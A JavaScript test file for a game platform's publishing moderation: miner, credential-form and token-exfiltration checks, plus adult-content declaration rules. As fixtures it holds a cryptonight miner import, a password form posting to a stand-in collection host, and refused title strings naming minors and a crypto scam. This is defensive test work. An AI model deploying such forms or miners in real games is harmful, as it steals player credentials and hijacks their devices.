// Rule-level tests of the publishing gates added by the moderation audit (the full corpus run is tests/moderation/audit.mjs).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { compareDeclared, conductRules, contentCheck, contentRules, credentialForms, declaredLevels, SEXUAL_LEVELS, VIOLENCE_LEVELS } from '../src/content-check.js';
import { pixelChange } from '../src/verify-core.js';
import { bundlePrints, compare, containment } from '../src/originality.js';

const carrier = { path: 'game.js', text: readFileSync(new URL('./moderation/carrier.js', import.meta.url), 'utf8') };

test('an ordinary game passes the conduct rules', () => {
  assert.equal(conductRules({ texts: [carrier], report: { conduct: {} } }).reason, null);
});

test('miner signatures are refused', () => {
  const r = conductRules({ texts: [carrier, { path: 'w.js', text: 'importScripts("cryptonight.js")' }] });
  assert.match(r.reason, /miner/);
});

test('a password posted to another site is refused, a password puzzle is not', () => {
  const form = '<form action="https://collect.example.invalid/x"><input type="password"></form>';
  assert.equal(credentialForms([{ path: 'index.html', text: form }]).length, 1);
  assert.match(conductRules({ texts: [{ path: 'index.html', text: form }] }).reason, /password/);
  const puzzle = '<input type="password" id="code"><script>if (code.value === "1234") open()</script>';
  assert.equal(conductRules({ texts: [{ path: 'index.html', text: puzzle }] }).reason, null);
});

test('a worker with a socket to another server is refused; sends alone are only notes', () => {
  const ws = { external: [{ type: 'websocket', host: 'relay.example.invalid' }], workers: 1 };
  assert.match(conductRules({ report: { conduct: ws } }).reason, /background worker/);
  const r = conductRules({ report: { conduct: { external: [{ type: 'fetch', method: 'POST', host: 'api.example.invalid' }] } } });
  assert.equal(r.reason, null);
  assert.equal(r.notes.length, 1);
});

test('fallback content rules: clear words only', () => {
  assert.equal(contentRules('Zombie Siege: shoot the undead, blood everywhere'), null);
  assert.equal(contentRules('A dark horror escape room'), null);
  assert.equal(contentRules('Sex chat game')?.category, 'sexual');
  assert.equal(contentRules('Send 0.1 BTC and get 0.2 back')?.category, 'scam');
});

test('content check: the AI verdict decides above the threshold, rules when AI is off', async () => {
  const listing = { title: 'Rock Dodger', tags: ['arcade'] };
  const ai = (p) => async () => ({ verdict: { type: 'choice', choice: 'x', probabilities: p } });
  assert.equal((await contentCheck({ listing, ai: ai({ fine: 0.9, hate: 0.1 }) })).ok, true);
  const bad = await contentCheck({ listing, ai: ai({ fine: 0.2, hate: 0.8 }) });
  assert.equal(bad.ok, false); assert.equal(bad.category, 'hate'); assert.equal(bad.by, 'ai');
  assert.equal((await contentCheck({ listing, ai: async () => null })).ok, true);
  assert.equal((await contentCheck({ listing: { title: 'nsfw pics' }, ai: null })).category, 'sexual');
});

test('pixel change counts only real differences', () => {
  const img = (v) => ({ w: 20, h: 20, bpp: 3, stride: 60, px: new Uint8Array(1200).fill(v) });
  assert.equal(pixelChange(img(10), img(20)), 0);
  assert.equal(pixelChange(img(10), img(200)), 1);
  assert.equal(pixelChange(img(10), null), 0);
});

test('a minified copy keeps most of its fingerprints', async () => {
  const esbuild = await import('esbuild');
  const src = readFileSync(new URL('../web/public/templates/canvas2d-arcade/src/main.js', import.meta.url), 'utf8');
  const min = esbuild.transformSync(src, { minify: true, loader: 'js' }).code;
  const a = bundlePrints([{ path: 'a.js', text: min }]), b = bundlePrints([{ path: 'b.js', text: src }]);
  assert.ok(containment(a, b) > 0.4, String(containment(a, b)));
});

test('sending the player token to another site is refused', () => {
  assert.match(conductRules({ report: { conduct: { tokenSent: 'collect.example.invalid' } } }).reason, /sign-in token/);
});

test('a small game copied whole is a copy, a small shared helper is not', () => {
  const src = readFileSync(new URL('./moderation/corpus/g-memory/index.html', import.meta.url), 'utf8');
  const P = (t) => ({ prints: bundlePrints([{ path: 'index.html', text: t }]), files: [], assets: [], look: null });
  assert.equal(compare(P(src.replace(/\bdeck\b/g, 'pile')), P(src)).verdict, 'copy');
});

// ---- adult games: allowed when declared, refused when not --------------------------------------------------------------
const said = (verdict, sexual, violence) => async (_m, _s, _q, extra) => ({ verdict: { type: 'choice', choice: 'fine', probabilities: verdict }, sexual: { type: 'choice', choice: 'x', probabilities: sexual }, violence: { type: 'choice', choice: 'x', probabilities: violence }, images: extra.images?.length || 0 });
const none = { none: 0.9, suggestive: 0.1, nudity: 0, explicit: 0 }, calm = { none: 0.9, cartoon: 0.1, fantasy: 0, realistic: 0, graphic: 0 };

test('declared sexual content passes; the same content undeclared fails', async () => {
  const seen = { none: 0.05, suggestive: 0.1, nudity: 0.25, explicit: 0.6 };
  const undeclared = await contentCheck({ listing: { title: 'Night Club' }, content: { sexual: 'none' }, ai: said({ fine: 0.95 }, seen, calm) });
  assert.equal(undeclared.ok, false); assert.equal(undeclared.undeclared, true); assert.equal(undeclared.category, 'sexual');
  assert.match(undeclared.reason, /explicit sexual content/);
  const declared = await contentCheck({ listing: { title: 'Night Club' }, content: { sexual: 'explicit' }, ai: said({ fine: 0.95 }, seen, calm) });
  assert.equal(declared.ok, true);
  // nudity declared, explicit seen: still more than declared
  assert.equal((await contentCheck({ listing: {}, content: { sexual: 'nudity' }, ai: said({ fine: 0.95 }, seen, calm) })).ok, false);
});

test('undeclared realistic or graphic violence fails; smaller gaps are notes', async () => {
  const gore = { none: 0, cartoon: 0, fantasy: 0.1, realistic: 0.3, graphic: 0.6 };
  const r = await contentCheck({ listing: {}, content: { violence: 'fantasy' }, ai: said({ fine: 0.9 }, none, gore) });
  assert.equal(r.ok, false); assert.equal(r.category, 'violence'); assert.equal(r.undeclared, true);
  assert.equal((await contentCheck({ listing: {}, content: { violence: 'graphic', blood: true }, ai: said({ fine: 0.9 }, none, gore) })).ok, true);
  const cartoon = await contentCheck({ listing: {}, content: { violence: 'none' }, ai: said({ fine: 0.9 }, none, { none: 0.2, cartoon: 0.7, fantasy: 0.1, realistic: 0, graphic: 0 }) });
  assert.equal(cartoon.ok, true);
  assert.match(cartoon.notes.join(' '), /cartoon violence/);
  // no declaration at all is read as none
  assert.equal((await contentCheck({ listing: {}, content: null, ai: said({ fine: 0.9 }, none, gore) })).ok, false);
});

test('compareDeclared needs the review to be sure enough', () => {
  const maybe = { none: 0.6, suggestive: 0.1, nudity: 0.2, explicit: 0.1 };
  assert.equal(compareDeclared(maybe, null, { sexual: 'none' }, 0.5).reason, null);
  assert.match(compareDeclared(maybe, null, { sexual: 'none' }, 0.25).reason, /nudity/);
});

test('content never allowed is refused even when adult content is declared', async () => {
  const r = await contentCheck({ listing: { title: 'Loli hentai dating' }, content: { sexual: 'explicit' }, ai: said({ fine: 0.99 }, none, calm) });
  assert.equal(r.ok, false); assert.equal(r.category, 'dangerous');
  const ai = await contentCheck({ listing: {}, content: { sexual: 'explicit' }, ai: said({ fine: 0.1, dangerous: 0.9 }, none, calm) });
  assert.equal(ai.ok, false); assert.equal(ai.category, 'dangerous');
  assert.equal((await contentCheck({ listing: {}, content: { sexual: 'explicit' }, ai: said({ fine: 0.2, scam: 0.8 }, none, calm) })).category, 'scam');
});

test('fallback rules: declared sexual words pass, undeclared fail, minors never', () => {
  assert.equal(contentRules('An nsfw visual novel', { sexual: 'explicit' }), null);
  assert.equal(contentRules('An nsfw visual novel', { sexual: 'suggestive' })?.undeclared, true);
  assert.equal(contentRules('An nsfw visual novel', null)?.category, 'sexual');
  assert.equal(contentRules('underage nsfw', { sexual: 'explicit' })?.category, 'dangerous');
  assert.match(contentRules('Gore everywhere', { violence: 'cartoon' }).notes[0], /realistic or graphic/);
});

test('the review sees the frames taken while the game was played', async () => {
  let got = 0;
  const ai = async (_m, state, _q, extra) => { got = extra.images.length; assert.ok(extra.images.every((u) => u.startsWith('data:image/'))); assert.ok(state.pictures); return null; };
  const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3]), png = new Uint8Array([0x89, 0x50, 0x4e, 0x47]);
  await contentCheck({ listing: {}, frames: [jpeg, jpeg, jpeg], shot: png, ai });
  assert.equal(got, 3);
  await contentCheck({ listing: {}, shot: png, ai });
  assert.equal(got, 1);
});

test('adult games can be switched off by the admin', async () => {
  const r = await contentCheck({ listing: {}, content: { violence: 'graphic' }, matureAllowed: false });
  assert.equal(r.ok, false); assert.equal(r.category, 'mature');
  assert.equal((await contentCheck({ listing: {}, content: { violence: 'fantasy' }, matureAllowed: false })).ok, true);
});

test('declaredLevels reads missing descriptors as none', () => {
  assert.deepEqual(declaredLevels(null), { sexual: 0, violence: 0, blood: false, adult: false, declared: false });
  assert.equal(declaredLevels({ sexual: 'nudity', violence: 'graphic' }).sexual, SEXUAL_LEVELS.indexOf('nudity'));
  assert.equal(declaredLevels({ violence: 'graphic' }).violence, VIOLENCE_LEVELS.length - 1);
});
